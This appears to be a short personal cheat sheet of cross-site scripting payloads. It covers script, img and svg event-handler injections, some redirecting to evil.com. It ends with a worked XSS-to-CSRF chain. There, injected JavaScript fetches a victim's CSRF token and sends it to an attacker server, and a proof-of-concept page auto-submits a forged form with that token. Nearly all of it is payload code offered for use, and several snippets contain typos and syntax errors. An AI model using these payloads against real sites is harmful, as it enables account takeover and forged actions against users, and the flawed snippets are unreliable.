Note -  url encode special charcters

<script>alert(1)</script>
<script>prompt(1)</script>
<script>confirm(1)</script>

<script>alert`1`</script>
<script>prompt`1`</script>
<script>confirm`1`</script>

<img src=1 onerror=alert(1)>
<img src=1 onerror=prompt(1)>
<img src=1 onerror= confirm(1)>
<img src=1 onmouseover=alert(1)>
<img src=1 onmouseover=confirm(1)>
<img src=1 onmouseover=prompt(1)>
<img src=1 onfocus=alert(1)>
<img src=1 onfocus=confirm(1)>
<img src=1 onfocus=prompt(1)>

"><svg/onload=promt(1)>
"><svg/onmouseover=promt(1)>
"><svg/onfocus=promt(1)>
"><svg/onload=confirm(1)>
"><svg/onmouseover=confirm(1)>
"><svg/onfocus=confirm(1)>
"><svg/onload=window.location("https://evil.com")>
"><svg/onmouseover=window.location("https://evil.com")>
"><svg/onfocus=window.location("https://evil.com")>


";window.location="https://evil.com";//996
";onfocus=alert(1)//123
-;'alert(1)-';



*************************************************************************

XSS chained for CSRF 

The app was fetching updated CSRF token everytime through a URL, we utilised that url to fetch latest csrf token and using  XSS sent it to attacker server in query parameter of URL which is hosting CSRF poc and the poc automatically fetch token from query parameter and executed poc successfully.

note - convert space and special characters into url encoding
     - edit host file of server to attackerserver.com and start http server on port 1234

<script>
fetch('https://vulnerable.com/somepage.do?Token)
    .then(response -> response.text())
        .then(data -> getcsrf(data));

function getcsrf(data){
    var token = data;
    window.location.replace('http://attackerserver.com:1234/csrfpoc.html?token=$(token)')
}
</script>

and CSRF POC

<html>
<body>
<form>
...
<input type="hidden" name="formCsrfToken" id=="token" value="" />
...
</form>
</body>

<script>
const queryString = window.location.search;
const urlParams = new URLSearchParams(queryString);
const token = urlParams.get('token');
var elem = document.getElementById("token");
elem.value = token;
history.pushState('','','/');
document.forms[0].submit();
</script>

</html>